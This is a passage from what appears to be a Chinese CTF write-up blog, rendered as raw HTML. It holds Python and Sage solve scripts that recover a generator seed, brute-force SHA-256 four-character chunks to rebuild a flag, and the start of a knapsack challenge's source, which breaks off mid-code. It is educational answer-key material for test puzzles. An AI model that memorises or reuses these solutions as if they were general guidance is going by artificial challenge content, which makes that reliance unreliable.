class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 爆破出seed2</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = <span class="number">956366446278</span></span><br><span class="line">b = <span class="number">1061992537343</span></span><br><span class="line">m = <span class="number">18068433704538283397</span></span><br><span class="line">state1 = <span class="number">1097363493609113</span></span><br><span class="line">state2 = <span class="number">2051431344160327</span></span><br><span class="line">B = <span class="number">636205571590</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span> ** <span class="number">12</span>):</span><br><span class="line">    s = state1 &lt;&lt; <span class="number">12</span></span><br><span class="line">    s += i</span><br><span class="line">    <span class="keyword">if</span> ((((a * s + b) % m) * s + B) % m) &gt;&gt; <span class="number">12</span> == state2:</span><br><span class="line">        s2 = ((((a * s + b) % m) * s + B) % m)</span><br><span class="line">        <span class="built_in">print</span>(s)</span><br><span class="line">        <span class="built_in">print</span>(s2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># s1 =  4494800869822930172</span></span><br><span class="line"><span class="comment"># s2 =  8402662785680701087</span></span><br></pre></td></tr></table></figure><p>seed</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sage 求解seed 花了三个小时，结果一行搞定</span></span><br><span class="line">a = 956366446278</span><br><span class="line">b = 1061992537343</span><br><span class="line">B = 636205571590</span><br><span class="line">m = 18068433704538283397</span><br><span class="line">S1 = 4494800869822930172</span><br><span class="line">S2 = 8402662785680701087</span><br><span class="line">kbits = 40</span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(m))</span><br><span class="line">f =  (a*x+b)*x+B-S1 <span class="comment"># f(x)</span></span><br><span class="line">print(f.roots())</span><br><span class="line"><span class="comment">#626844643882</span></span><br></pre></td></tr></table></figure><p>flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_letters, digits</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># seed = getRandomNBitInteger(40)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SHA256</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.proof = []</span><br><span class="line">        self.sha = <span class="number">0</span></span><br><span class="line">        self.sha_flag = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encryption</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag) // <span class="number">4</span>):</span><br><span class="line">            self.proof.append(flag[<span class="number">4</span> * i:<span class="number">4</span> + <span class="number">4</span> * i])</span><br><span class="line">            self.sha = sha256(self.proof[i]).hexdigest().encode()</span><br><span class="line">            self.sha_flag.append(bytes_to_long(self.sha))</span><br><span class="line">        <span class="keyword">return</span> self.sha_flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RHODES_ELITE</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.Doctor = <span class="number">18068433704538283397</span></span><br><span class="line">        self.Amiya = <span class="number">956366446278</span></span><br><span class="line">        self.Rosmontis = <span class="number">1061992537343</span></span><br><span class="line">        self.Blaze = <span class="number">636205571590</span></span><br><span class="line">        self.seed = <span class="number">626844643882</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.seed = (self.Amiya * self.seed * self.seed + self.Rosmontis * self.seed + self.Blaze) % self.Doctor</span><br><span class="line">        <span class="keyword">return</span> self.seed &gt;&gt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">output</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Amiya = &quot;</span>, self.Amiya)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Rosmontis = &quot;</span>, self.Rosmontis)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Blaze = &quot;</span>, self.Blaze)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Doctor = &quot;</span>, self.Doctor)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">W = <span class="number">1920358673646340365826516899186299898354902389402251443712585240681673718967552394250439615271108958695077816395789102908554482423707690040360881719002797624203057223577713119411615697309430781610828105111854807558984242631896605944487456402584672441464316236703857236007195673926937583757881853655505218912262929700452404084</span></span><br><span class="line">W = long_to_bytes(W)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 经过测试每15个对应一次组四字long_to_bytes</span></span><br><span class="line">tmp = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(W) // <span class="number">15</span>):</span><br><span class="line">    tmp.append(bytes_to_long(W[<span class="number">15</span>*i: <span class="number">15</span>*i+<span class="number">15</span>]))</span><br><span class="line"></span><br><span class="line">ss = []  <span class="comment"># sha_flag[i] % (seed ** 3)</span></span><br><span class="line">elite = RHODES_ELITE()</span><br><span class="line"><span class="built_in">print</span>(elite.<span class="built_in">next</span>())</span><br><span class="line"><span class="built_in">print</span>(elite.<span class="built_in">next</span>())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tmp:  <span class="comment"># [sha_flag[i] % (seed ** 3) ^ (elite.next() % 100)) for i in range(len(sha_flag))]</span></span><br><span class="line">    ss.append(i ^ (elite.<span class="built_in">next</span>() % <span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">seed = <span class="number">626844643882</span>**<span class="number">3</span></span><br><span class="line"></span><br><span class="line">table = ascii_letters + digits + <span class="string">&#x27;-&#x27;</span></span><br><span class="line">data_dict = &#123;&#125;  <span class="comment"># 建立字典</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> product(table, repeat=<span class="number">4</span>):  <span class="comment"># 遍历所有四字</span></span><br><span class="line">    head = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">    <span class="built_in">print</span>(head)</span><br><span class="line">    tmp = bytes_to_long(sha256(head.encode()).hexdigest().encode()) % seed</span><br><span class="line">    data_dict[tmp] = head  <span class="comment"># 字典</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ss:  <span class="comment"># 查字典</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(data_dict[i], end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>, i, <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="Bag"><a href="#Bag" class="headerlink" title="Bag"></a>Bag</h2><h3 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">import</span> gmpy<span class="number">2</span></span><br><span class="line"><span class="attribute">from</span> Crypto.Util.number import *</span><br><span class="line"><span class="attribute">from</span> secret import flag</span><br><span class="line"></span><br><span class="line"><span class="attribute">message</span> = bytes_to_long(flag[<span class="number">8</span>:-<span class="number">1</span>])</span><br><span class="line"><span class="attribute">Baglenth</span>=<span class="number">286</span></span><br><span class="line"><span class="attribute">Bag</span>=[<span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">24</span>, <span class="number">48</span>, <span class="number">96</span>, <span class="number">192</span>, <span class="number">384</span>, <span class="number">768</span>, <span class="number">1536</span>, <span class="number">3072</span>, <span class="number">6144</span>, <span class="number">12288</span>, <span class="number">24576</span>, <span class="number">49152</span>, <span class="number">98304</span>, <span class="number">196608</span>, <span class="number">393216</span>, <span class="number">786432</span>, <span class="number">1572864</span>, <span class="number">3145728</span>, <span class="number">6291456</span>, <span class="number">12582912</span>, <span class="number">25165824</span>, <span class="number">50331648</span>, <span class="number">100663296</span>, <span class="number">201326592</span>, <span class="number">402653184</span>, <span class="number">805306368</span>, <span class="number">1610612736</span>, <span class="number">3221225472</span>, <span class="number">6442450944</span>, <span class="number">12884901888</span>, <span class="number">25769803776</span>, <span class="number">51539607552</span>, <span class="number">103079215104</span>, <span class="number">206158430208</span>, <span class="number">412316860416</span>, <span class="number">824633720832</span>, <span class="number">1649267441664</span>, <span class="number">3298534883328</span>, <span class="number">6597069766656</span>, <span class="number">13194139533312</span>, <span class="number">26388279066624</span>, <span class="number">52776558133248</span>, <span class="number">105553116266496</span>, <span class="number">211106232532992</span>, <span class="number">422212465065984</span>, <span class="number">844424930131968</span>, <span class="number">1688849860263936</span>, <span class="number">3377699720527872</span>, <span class="number">6755399441055744</span>, <span class="number">13510798882111488</span>, <span class="number">27021597764222976</span>, <span class="number">54043195528445952</span>, <span class="number">108086391056891904</span>, <span class="number">216172782113783808</span>, <span class="number">432345564227567616</span>, <span class="number">864691128455135232</span>, <span class="number">1729382256910270464</span>, <span class="number">3458764513820540928</span>, <span class="number">6917529027641081856</span>, <span class="number">13835058055282163712</span>, <span class="number">27670116110564327424</span>, <span class="number">55340232221128654848</span>, <span class="number">110680464442257309696</span>, <span class="number">221360928884514619392</span>, <span class="number">442721857769029238784</span>, <span class="number">885443715538058477568</span>, <span class="number">1770887431076116955136</span>, <span class="number">3541774862152233910272</span>, <span class="number">7083549724304467820544</span>, <span class="number">14167099448608935641088</span>, <span class="number">28334198897217871282176</span>, <span class="number">56668397794435742564352</span>, <span class="number">113336795588871485128704</span>, <span class="number">226673591177742970257408</span>, <span class="number">453347182355485940514816</span>, <span class="number">906694364710971881029632</span>, <span class="number">1813388729421943762059264</span>, <span class="number">3626777458843887524118528</span>, <span class="number">7253554917687775048237056</span>, <span class="number">14507109835375550096474112</span>, <span class="number">29014219670751100192948224</span>, <span class="number">58028439341502200385896448</span>, <span class="number">116056878683004400771792896</span>, <span class="number">232113757366008801543585792</span>, <span class="number">464227514732017603087171584</span>, <span class="number">928455029464035206174343168</span>, <span class="number">1856910058928070412348686336</span>, <span class="number">3713820117856140824697372672</span>, <span class="number">7427640235712281649394745344</span>, <span class="number">14855280471424563298789490688</span>, <span class="number">29710560942849126597578981376</span>, <span class="number">59421121885698253195157962752</span>, <span class="number">118842243771396506390315925504</span>, <span class="number">237684487542793012780631851008</span>, <span class="number">475368975085586025561263702016</span>, <span class="number">950737950171172051122527404032</span>, <span class="number">1901475900342344102245054808064</span>, <span class="number">3802951800684688204490109616128</span>, <span class="number">7605903601369376408980219232256</span>, <span class="number">15211807202738752817960438464512</span>, <span class="number">30423614405477505635920876929024</span>, <span class="number">60847228810955011271841753858048</span>, <span class="number">121694457621910022543683507716096</span>, <span class="number">243388915243820045087367015432192</span>, <span class="number">486777830487640090174734030864384</span>, <span class="number">973555660975280180349468061728768</span>, <span class="number">1947111321950560360698936123457536</span>, <span class="number">3894222643901120721397872246915072</span>, <span class="number">7788445287802241442795744493830144</span>, <span class="number">15576890575604482885591488987660288</span>, <span class="number">31153781151208965771182977975320576</span>, <span class="number">62307562302417931542365955950641152</span>, <span class="number">124615124604835863084731911901282304</span>, <span class="number">249230249209671726169463823802564608</span>, <span class="number">498460498419343452338927647605129216</span>, <span class="number">996920996838686904677855295210258432</span>, <span class="number">1993841993677373809355710590420516864</span>, <span class="number">3987683987354747618711421180841033728</span>, <span class="number">7975367974709495237422842361682067456</span>, <span class="number">15950735949418990474845684723364134912</span>, <span class="number">31901471898837980949691369446728269824</span>, <span class="number">63802943797675961899382738893456539648</span>, <span class="number">127605887595351923798765477786913079296</span>, <span class="number">255211775190703847597530955573826158592</span>, <span class="number">510423550381407695195061911147652317184</span>, <span class="number">1020847100762815390390123822295304634368</span>, <span class="number">2041694201525630780780247644590609268736</span>, <span class="number">4083388403051261561560495289181218537472</span>, <span class="number">8166776806102523123120990578362437074944</span>, <span class="number">16333553612205046246241981156724874149888</span>, <span class="number">32667107224410092492483962313449748299776</span>, <span class="number">65334214448820184984967924626899496599552</span>, <span class="number">130668428897640369969935849253798993199104</span>, <span class="number">261336857795280739939871698507597986398208</span>, <span class="number">522673715590561479879743397015195972796416</span>, <span class="number">1045347431181122959759486794030391945592832</span>, <span class="number">2090694862362245919518973588060783891185664</span>, <span class="number">4181389724724491839037947176121567782371328</span>, <span class="number">8362779449448983678075894352243135564742656</span>, <span class="number">16725558898897967356151788704486271129485312</span>, <span class="number">33451117797795934712303577408972542258970624</span>, <span class="number">66902235595591869424607154817945084517941248</span>, <span class="number">133804471191183738849214309635890169035882496</span>, <span class="number">267608942382367477698428619271780338071764992</span>, <span class="number">535217884764734955396857238543560676143529984</span>, <span class="number">1070435769529469910793714477087121352287059968</span>, <span class="number">2140871539058939821587428954174242704574119936</span>, <span class="number">4281743078117879643174857908348485409148239872</span>, <span class="number">8563486156235759286349715816696970818296479744</span>, <span class="number">17126972312471518572699431633393941636592959488</span>, <span class="number">34253944624943037145398863266787883273185918976</span>, <span class="number">68507889249886074290797726533575766546371837952</span>, <span class="number">137015778499772148581595453067151533092743675904</span>, <span class="number">274031556999544297163190906134303066185487351808</span>, <span class="number">548063113999088594326381812268606132370974703616</span>, <span class="number">1096126227998177188652763624537212264741949407232</span>, <span class="number">2192252455996354377305527249074424529483898814464</span>, <span class="number">4384504911992708754611054498148849058967797628928</span>, <span class="number">8769009823985417509222108996297698117935595257856</span>, <span class="number">17538019647970835018444217992595396235871190515712</span>, <span class="number">35076039295941670036888435985190792471742381031424</span>, <span class="number">70152078591883340073776871970381584943484762062848</span>, <span class="number">140304157183766680147553743940763169886969524125696</span>, <span class="number">280608314367533360295107487881526339773939048251392</span>, <span class="number">561216628735066720590214975763052679547878096502784</span>, <span class="number">1122433257470133441180429951526105359095756193005568</span>, <span class="number">2244866514940266882360859903052210718191512386011136</span>, <span class="number">4489733029880533764721719806104421436383024772022272</span>, <span class="number">8979466059761067529443439612208842872766049544044544</span>, <span class="number">17958932119522135058886879224417685745532099088089088</span>, <span class="number">35917864239044270117773758448835371491064198176178176</span>, <span class="number">71835728478088540235547516897670742982128396352356352</span>, <span class="number">143671456956177080471095033795341485964256792704712704</span>, <span class="number">287342913912354160942190067590682971928513585409425408</span>, <span class="number">574685827824708321884380135181365943857027170818850816</span>, <span class="number">1149371655649416643768760270362731887714054341637701632</span>, <span class="number">2298743311298833287537520540725463775428108683275403264</span>, <span class="number">4597486622597666575075041081450927550856217366550806528</span>, <span class="number">9194973245195333150150082162901855101712434733101613056</span>, <span class="number">18389946490390666300300164325803710203424869466203226112</span>, <span class="number">36779892980781332600600328651607420406849738932406452224</span>, <span class="number">73559785961562665201200657303214840813699477864812904448</span>, <span class="number">147119571923125330402401314606429681627398955729625808896</span>, <span class="number">294239143846250660804802629212859363254797911459251617792</span>, <span class="number">588478287692501321609605258425718726509595822918503235584</span>, <span class="number">1176956575385002643219210516851437453019191645837006471168</span>, <span class="number">2353913150770005286438421033702874906038383291674012942336</span>, <span class="number">4707826301540010572876842067405749812076766583348025884672</span>, <span class="number">9415652603080021145753684134811499624153533166696051769344</span>, <span class="number">18831305206160042291507368269622999248307066333392103538688</span>, <span class="number">37662610412320084583014736539245998496614132666784207077376</span>, <span class="number">75325220824640169166029473078491996993228265333568414154752</span>, <span class="number">150650441649280338332058946156983993986456530667136828309504</span>, <span class="number">301300883298560676664117892313967987972913061334273656619008</span>, <span class="number">602601766597121353328235784627935975945826122668547313238016</span>, <span class="number">1205203533194242706656471569255871951891652245337094626476032</span>, <span class="number">2410407066388485413312943138511743903783304490674189252952064</span>, <span class="number">4820814132776970826625886277023487807566608981348378505904128</span>, <span class="number">9641628265553941653251772554046975615133217962696757011808256</span>, <span class="number">19283256531107883306503545108093951230266435925393514023616512</span>, <span class="number">38566513062215766613007090216187902460532871850787028047233024</span>, <span class="number">77133026124431533226014180432375804921065743701574056094466048</span>, <span class="number">154266052248863066452028360864751609842131487403148112188932096</span>, <span class="number">308532104497726132904056721729503219684262974806296224377864192</span>, <span class="number">617064208995452265808113443459006439368525949612592448755728384</span>, <span class="number">1234128417990904531616226886918012878737051899225184897511456768</span>, <span class="number">2468256835981809063232453773836025757474103798450369795022913536</span>, <span class="number">4936513671963618126464907547672051514948207596900739590045827072</span>, <span class="number">9873027343927236252929815095344103029896415193801479180091654144</span>, <span class="number">19746054687854472505859630190688206059792830387602958360183308288</span>, <span class="number">39492109375708945011719260381376412119585660775205916720366616576</span>, <span class="number">78984218751417890023438520762752824239171321550411833440733233152</span>, <span class="number">157968437502835780046877041525505648478342643100823666881466466304</span>, <span class="number">315936875005671560093754083051011296956685286201647333762932932608</span>, <span class="number">631873750011343120187508166102022593913370572403294667525865865216</span>, <span class="number">1263747500022686240375016332204045187826741144806589335051731730432</span>, <span class="number">2527495000045372480750032664408090375653482289613178670103463460864</span>, <span class="number">5054990000090744961500065328816180751306964579226357340206926921728</span>, <span class="number">10109980000181489923000130657632361502613929158452714680413853843456</span>, <span class="number">20219960000362979846000261315264723005227858316905429360827707686912</span>, <span class="number">40439920000725959692000522630529446010455716633810858721655415373824</span>, <span class="number">80879840001451919384001045261058892020911433267621717443310830747648</span>, <span class="number">161759680002903838768002090522117784041822866535243434886621661495296</span>, <span class="number">323519360005807677536004181044235568083645733070486869773243322990592</span>, <span class="number">647038720011615355072008362088471136167291466140973739546486645981184</span>, <span class="number">1294077440023230710144016724176942272334582932281947479092973291962368</span>, <span class="number">2588154880046461420288033448353884544669165864563894958185946583924736</span>, <span class="number">5176309760092922840576066896707769089338331729127789916371893167849472</span>, <span class="number">10352619520185845681152133793415538178676663458255579832743786335698944</span>, <span class="number">20705239040371691362304267586831076357353326916511159665487572671397888</span>, <span class="number">41410478080743382724608535173662152714706653833022319330975145342795776</span>, <span class="number">82820956161486765449217070347324305429413307666044638661950290685591552</span>, <span class="number">165641912322973530898434140694648610858826615332089277323900581371183104</span>, <span class="number">331283824645947061796868281389297221717653230664178554647801162742366208</span>, <span class="number">662567649291894123593736562778594443435306461328357109295602325484732416</span>, <span class="number">1325135298583788247187473125557188886870612922656714218591204650969464832</span>, <span class="number">2650270597167576494374946251114377773741225845313428437182409301938929664</span>, <span class="number">5300541194335152988749892502228755547482451690626856874364818603877859328</span>, <span class="number">10601082388670305977499785004457511094964903381253713748729637207755718656</span>, <span class="number">21202164777340611954999570008915022189929806762507427497459274415511437312</span>, <span class="number">42404329554681223909999140017830044379859613525014854994918548831022874624</span>, <span class="number">84808659109362447819998280035660088759719227050029709989837097662045749248</span>, <span class="number">169617318218724895639996560071320177519438454100059419979674195324091498496</span>, <span class="number">339234636437449791279993120142640355038876908200118839959348390648182996992</span>, <span class="number">678469272874899582559986240285280710077753816400237679918696781296365993984</span>, <span class="number">1356938545749799165119972480570561420155507632800475359837393562592731987968</span>, <span class="number">2713877091499598330239944961141122840311015265600950719674787125185463975936</span>, <span class="number">5427754182999196660479889922282245680622030531201901439349574250370927951872</span>, <span class="number">10855508365998393320959779844564491361244061062403802878699148500741855903744</span>, <span class="number">21711016731996786641919559689128982722488122124807605757398297001483711807488</span>, <span class="number">43422033463993573283839119378257965444976244249615211514796594002967423614976</span>, <span class="number">86844066927987146567678238756515930889952488499230423029593188005934847229952</span>, <span class="number">173688133855974293135356477513031861779904976998460846059186376011869694459904</span>, <span class="number">347376267711948586270712955026063723559809953996921692118372752023739388919808</span>, <span class="number">694752535423897172541425910052127447119619907993843384236745504047478777839616</span>, <span class="number">1389505070847794345082851820104254894239239815987686768473491008094957555679232</span>, <span class="number">2779010141695588690165703640208509788478479631975373536946982016189915111358464</span>, <span class="number">5558020283391177380331407280417019576956959263950747073893964032379830222716928</span>, <span class="number">11116040566782354760662814560834039153913918527901494147787928064759660445433856</span>, <span class="number">22232081133564709521325629121668078307827837055802988295575856129519320890867712</span>, <span class="number">44464162267129419042651258243336156615655674111605976591151712259038641781735424</span>, <span class="number">88928324534258838085302516486672313231311348223211953182303424518077283563470848</span>, <span class="number">177856649068517676170605032973344626462622696446423906364606849036154567126941696</span>, <span class="number">355713298137035352341210065946689252925245392892847812729213698072309134253883392</span>, <span class="number">711426596274070704682420131893378505850490785785695625458427396144618268507766784</span>, <span class="number">1422853192548141409364840263786757011700981571571391250916854792289236537015533568</span>, <span class="number">2845706385096282818729680527573514023401963143142782501833709584578473074031067136</span>, <span class="number">5691412770192565637459361055147028046803926286285565003667419169156946148062134272</span>, <span class="number">11382825540385131274918722110294056093607852572571130007334838338313892296124268544</span>, <span class="number">22765651080770262549837444220588112187215705145142260014669676676627784592248537088</span>, <span class="number">45531302161540525099674888441176224374431410290284520029339353353255569184497074176</span>, <span class="number">91062604323081050199349776882352448748862820580569040058678706706511138368994148352</span>, <span class="number">182125208646162100398699553764704897497725641161138080117357413413022276737988296704</span>, <span class="number">364250417292324200797399107529409794995451282322276160234714826826044553475976593408</span>, <span class="number">728500834584648401594798215058819589990902564644552320469429653652089106951953186816</span>, <span class="number">1457001669169296803189596430117639179981805129289104640938859307304178213903906373632</span>, <span class="number">2914003338338593606379192860235278359963610258578209281877718614608356427807812747264</span>, <span class="number">5828006676677187212758385720470556719927220517156418563755437229216712855615625494528</span>, <span class="number">11656013353354374425516771440941113439854441034312837127510874458433425711231250989056</span>, <span class="number">23312026706708748851033542881882226879708882068625674255021748916866851422462501978112</span>, <span class="number">46624053413417497702067085763764453759417764137251348510043497833733702844925003956224</span>, <span class="number">93248106826834995404134171527528907518835528274502697020086995667467405689850007912448</span>, <span class="number">186496213653669990808268343055057815037671056549005394040173991334934811379700015824896</span>]</span><br><span class="line"><span class="attribute">Bag</span>=Bag[::-<span class="number">1</span>]</span><br><span class="line"><span class="attribute">m</span>=<span class="number">372992427307339981616536686110115630075342113098010788080347982669869622759400031649792</span></span><br><span class="line"><span class="attribute">w</span>=<span class="number">274062421102700155372289583695782343443</span></span><br><span class="line"><span class="attribute">assert</span> gmpy<span class="number">2</span>.gcd(m,w)==<span class="number">1</span></span><br><span class="line"><span class="attribute">h</span>=<span class="number">0</span></span><br><span class="line"><span class="attribute">j</span>=<span class="number">0</span></span><br><span class="line"><span class="attribute">if</span> m.bit_length()%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">    <span class="attribute">h</span>=m.bit_length()</span><br><span class="line">    <span class="attribute">j</span>=int(h//<span class="number">2</span>)</span><br><span class="line"><span class="attribute">else</span>:</span><br><span class="line">    <span class="attribute">h</span>=m.bit_length()</span><br><span class="line">    <span class="attribute">j</span>=int(h//<span class="number">2</span>+<span class="number">1</span>)</span><br><span class="line"><span class="attribute">def</span> pad(m,lenth):</span><br><span class="line">    <span class="attribute">while</span> len(m)&lt;lenth:</span><br><span class="line">        <span class="attribute">m</span>=&#x27;<span class="number">0</span>&#x27;+m</span><br><span class="line">    <span class="attribute">return</span> m</span><br><span class="line"><span class="attribute">def</span> keygen():</span><br><span class="line">    <span class="attribute">pk</span>=[]</span><br><span class="line">    <span class="attribute">sk</span>=[]</span><br><span class="line">    <span class="attribute">sk</span>.append(m)</span><br><span class="line">    <span class="attribute">sk</span>.append(int(gmpy<span class="number">2</span>.invert(w,m)))</span><br><span class="line">    <span class="attribute">D</span>=[]</span><br><span class="line">    <span class="attribute">binD</span>=[]</span><br><span class="line">    <span class="attribute">for</span> i in range(Baglenth):</span><br><span class="line">        <span class="attribute">di</span>=(w*Bag[i])%m</span><br><span class="line">        <span class="attribute">D</span>.append(di)</span><br><span class="line">        <span class="attribute">bindi</span>=bin(di)[<span class="number">2</span>:]</span><br><span class="line">        <span class="attribute">bindi</span>=pad(bindi,h)</span><br><span class="line">        <span class="attribute">binD</span>.append(bindi)</span><br><span class="line">    <span class="attribute">U</span>=[]</span><br><span class="line">    <span class="attribute">V</span>=[]</span><br><span class="line">    <span class="attribute">for</span> i in range(Baglenth):</span><br><span class="line">        <span class="attribute">tempu</span>=int(str(binD[i][:j]),<span class="number">2</span>)</span><br><span class="line">        <span class="attribute">U</span>.append(tempu)</span><br><span class="line">        <span class="attribute">tempv</span>=int(str(binD[i][j:]),<span class="number">2</span>)</span><br><span class="line">        <span class="attribute">V</span>.append(tempv)</span><br><span class="line">    <span class="attribute">e</span>=gmpy<span class="number">2</span>.next_prime(sum(V))+<span class="number">2</span></span><br><span class="line">    <span class="attribute">f</span>=gmpy<span class="number">2</span>.next_prime(sum(U))</span><br><span class="line">    <span class="attribute">assert</span> gmpy<span class="number">2</span>.gcd(e,f)==<span class="number">1</span></span><br><span class="line">    <span class="attribute">sk</span>.append(int(e))</span><br><span class="line">    <span class="attribute">sk</span>.append(int(f))</span><br><span class="line">    <span class="attribute">for</span> i in range(Baglenth):</span><br><span class="line">        <span class="attribute">ai</span>=e*U[i]+f*V[i]</span><br><span class="line">        <span 